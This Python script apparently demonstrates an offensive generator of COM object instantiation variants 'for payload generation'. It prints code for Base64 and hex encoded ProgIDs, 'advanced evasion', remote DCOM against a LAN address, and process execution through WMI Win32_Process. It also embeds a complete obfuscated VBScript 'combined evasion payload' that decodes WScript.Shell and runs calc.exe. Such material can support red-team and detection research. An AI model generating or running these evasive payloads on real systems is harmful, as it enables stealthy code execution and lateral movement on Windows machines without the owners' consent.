#!/usr/bin/env python3
"""
COM Object Instantiation Examples
Demonstrates practical usage of COM object variants for payload generation
"""

from com_object_variants import COMObjectVariantGenerator
import json


def example_basic_instantiation():
    """Example: Basic CreateObject and GetObject usage"""
    print("\n" + "=" * 80)
    print("EXAMPLE 1: BASIC COM OBJECT INSTANTIATION")
    print("=" * 80 + "\n")

    gen = COMObjectVariantGenerator()

    # CreateObject with ProgID
    print("[CreateObject with ProgID]")
    code = gen.generate_createobject_progid("Excel.Application")
    print(code)
    print()

    # CreateObject with CLSID
    print("[CreateObject with CLSID]")
    code = gen.generate_createobject_clsid("{00024500-0000-0000-C000-000000000046}")
    print(code)
    print()

    # GetObject for running instance
    print("[GetObject for Running Instance]")
    code = gen.generate_getobject_progid("Excel.Application")
    print(code)
    print()


def example_obfuscation_techniques():
    """Example: Obfuscated COM object instantiation"""
    print("\n" + "=" * 80)
    print("EXAMPLE 2: OBFUSCATION TECHNIQUES")
    print("=" * 80 + "\n")

    gen = COMObjectVariantGenerator()

    # Base64 encoded ProgID
    print("[Encoded ProgID - Base64]")
    code = gen.generate_encoded_progid_createobject("WScript.Shell", "base64")
    print(code)
    print()

    # Hex encoded ProgID
    print("[Encoded ProgID - Hex]")
    code = gen.generate_encoded_progid_createobject("Excel.Application", "hex")
    print(code)
    print()

    # Registry lookup
    print("[Registry Lookup Method]")
    code = gen.generate_registry_lookup_progid("Excel.Application")
    print(code)
    print()


def example_remote_and_dcom():
    """Example: Remote COM object instantiation via DCOM"""
    print("\n" + "=" * 80)
    print("EXAMPLE 3: REMOTE COM & DCOM")
    print("=" * 80 + "\n")

    gen = COMObjectVariantGenerator()

    # Remote machine instantiation
    print("[Remote CreateObject via DCOM]")
    code = gen.generate_createobject_with_machine("Excel.Application", "192.168.1.100")
    print(code)
    print()

    # WMI moniker binding
    print("[WMI Moniker Binding]")
    code = gen.generate_getobject_winmgmts("root\\cimv2")
    print(code)
    print()


def example_wmi_integration():
    """Example: WMI class integration with COM"""
    print("\n" + "=" * 80)
    print("EXAMPLE 4: WMI INTEGRATION")
    print("=" * 80 + "\n")

    gen = COMObjectVariantGenerator()

    # WMI class instantiation
    print("[WMI Class Instantiation via SWbemServices]")
    code = gen.generate_wmi_class_instantiation("Win32_Process", "root\\cimv2")
    print(code)
    print()

    # Alternative namespace
    print("[WMI with Different Namespace]")
    code = gen.generate_wmi_class_instantiation("CIM_ComputerSystem", "root\\cimv2")
    print(code)
    print()


def example_advanced_evasion():
    """Example: Advanced evasion techniques"""
    print("\n" + "=" * 80)
    print("EXAMPLE 5: ADVANCED EVASION")
    print("=" * 80 + "\n")

    gen = COMObjectVariantGenerator()

    # Inline class definition
    print("[Inline VBScript Class]")
    code = gen.generate_inline_vbscript_class("ComObject")
    print(code)
    print()

    # CLSID registry moniker
    print("[CLSID Registry Moniker]")
    code = gen.generate_clsid_registry_moniker("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}")
    print(code)
    print()

    # Rundll32 alternative
    print("[Rundll32 COM Instantiation]")
    code = gen.generate_rundll_com_instantiation("shell32.dll", "ShellExecuteA")
    print(code)
    print()


def example_application_specific():
    """Example: Application-specific COM variants"""
    print("\n" + "=" * 80)
    print("EXAMPLE 6: APPLICATION-SPECIFIC VARIANTS")
    print("=" * 80 + "\n")

    gen = COMObjectVariantGenerator()

    # Excel variants
    excel_variants = gen.generate_excel_com_variants()
    print("[Excel.Application Variants]")
    for variant_id, variant_info in excel_variants.items():
        print(f"\n{variant_id}:")
        print(f"Description: {variant_info['description']}")
        print(f"Code Sample: {variant_info['code'][:100]}...")
    print()


def example_progid_version_detection():
    """Example: Version-aware ProgID variants"""
    print("\n" + "=" * 80)
    print("EXAMPLE 7: PROGID VERSION VARIANTS")
    print("=" * 80 + "\n")

    gen = COMObjectVariantGenerator()

    # Multiple versions
    print("[Excel Version Variants - First 5]")
    versions = gen.generate_progid_version_variants("Excel.Application")
    for variant in versions[:5]:
        print(f"\nVersion {variant['version']}:")
        print(f"ProgID: {variant['progid']}")
        print(f"Code:\n{variant['code']}")
    print()


def example_all_variants_json():
    """Example: Export all variants as JSON"""
    print("\n" + "=" * 80)
    print("EXAMPLE 8: ALL VARIANTS AS JSON")
    print("=" * 80 + "\n")

    gen = COMObjectVariantGenerator()
    variants = gen.generate_all_variants()

    # Convert to JSON-serializable format
    json_variants = {}
    for key, val in variants.items():
        json_variants[key] = {
            "description": val["description"],
            "category": val["category"]
        }

    # Show first 5 variants
    print("Total variants available:", len(json_variants))
    print("\nFirst 5 variants (JSON format):")
    for key in list(json_variants.keys())[:5]:
        print(f"  {key}: {json_variants[key]['description']}")


def example_combined_techniques():
    """Example: Combined evasion + payload techniques"""
    print("\n" + "=" * 80)
    print("EXAMPLE 9: COMBINED EVASION PAYLOAD")
    print("=" * 80 + "\n")

    gen = COMObjectVariantGenerator()

    # Complex payload combining multiple techniques
    payload = '''
' Combined evasion payload using multiple COM instantiation techniques

Function DecodeBase64(encoded)
    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.CreateElement("tmp")
    node.DataType = "bin.base64"
    node.Text = encoded
    DecodeBase64 = node.NodeTypedValue
End Function

Dim objShell1, objShell2
On Error Resume Next

' Technique 1: Encoded ProgID
Set objShell1 = CreateObject(DecodeBase64("V1NjcmlwdC5TaGVsbA=="))

' Technique 2: Registry lookup
Dim regHive
regHive = "HKCR\\\\WScript.Shell\\\\CLSID\\\\"
Set objShell2 = CreateObject("CLSID:" & CreateObject("WScript.Shell").RegRead(regHive))

' Technique 3: Direct late binding
If IsEmpty(objShell1) Then
    Set objShell1 = CreateObject("WScript.Shell")
End If

If Not IsEmpty(objShell1) Then
    ' Execute payload
    objShell1.Run "calc.exe"
End If

On Error GoTo 0
'''
    print(payload)


def example_com_reference():
    """Example: Reference common COM objects"""
    print("\n" + "=" * 80)
    print("EXAMPLE 10: COMMON COM OBJECTS REFERENCE")
    print("=" * 80 + "\n")

    gen = COMObjectVariantGenerator()

    print("Available COM Objects (ProgID -> CLSID):")
    print("-" * 80)
    for progid, clsid in sorted(gen.COM_OBJECTS.items()):
        print(f"  {progid:<40} {clsid}")


def example_scenario_payload_generation():
    """Example: Real-world scenario - WMI Process execution"""
    print("\n" + "=" * 80)
    print("EXAMPLE 11: REAL-WORLD SCENARIO - WMI PROCESS EXECUTION")
    print("=" * 80 + "\n")

    gen = COMObjectVariantGenerator()

    print("[Scenario: Execute PowerShell via WMI using multiple instantiation methods]")
    print()

    # Method 1: Direct CreateObject
    print("Method 1 - Direct CreateObject:")
    code1 = gen.generate_createobject_progid("WbemScripting.SWbemLocator")
    print(code1)
    print()

    # Method 2: GetObject with WMI moniker
    print("Method 2 - GetObject with WMI Moniker:")
    code2 = gen.generate_getobject_winmgmts("root\\cimv2")
    print(code2)
    print()

    # Method 3: WMI class instantiation
    print("Method 3 - WMI Class Instantiation:")
    code3 = gen.generate_wmi_class_instantiation("Win32_Process", "root\\cimv2")
    print(code3)
    print()


def run_all_examples():
    """Run all example demonstrations"""
    examples = [
        ("Basic Instantiation", example_basic_instantiation),
        ("Obfuscation", example_obfuscation_techniques),
        ("Remote & DCOM", example_remote_and_dcom),
        ("WMI Integration", example_wmi_integration),
        ("Advanced Evasion", example_advanced_evasion),
        ("Application-Specific", example_application_specific),
        ("ProgID Versions", example_progid_version_detection),
        ("All Variants JSON", example_all_variants_json),
        ("Combined Techniques", example_combined_techniques),
        ("COM Reference", example_com_reference),
        ("Real-World Scenario", example_scenario_payload_generation),
    ]

    print("\n" + "=" * 80)
    print("COM OBJECT INSTANTIATION - COMPREHENSIVE EXAMPLES")
    print("=" * 80)
    print(f"Total Examples: {len(examples)}\n")

    for idx, (title, func) in enumerate(examples, 1):
        print(f"Running Example {idx}/{len(examples)}: {title}...")
        try:
            func()
        except Exception as e:
            print(f"Error in example: {e}")

    print("\n" + "=" * 80)
    print("ALL EXAMPLES COMPLETED")
    print("=" * 80 + "\n")


if __name__ == "__main__":
    run_all_examples()
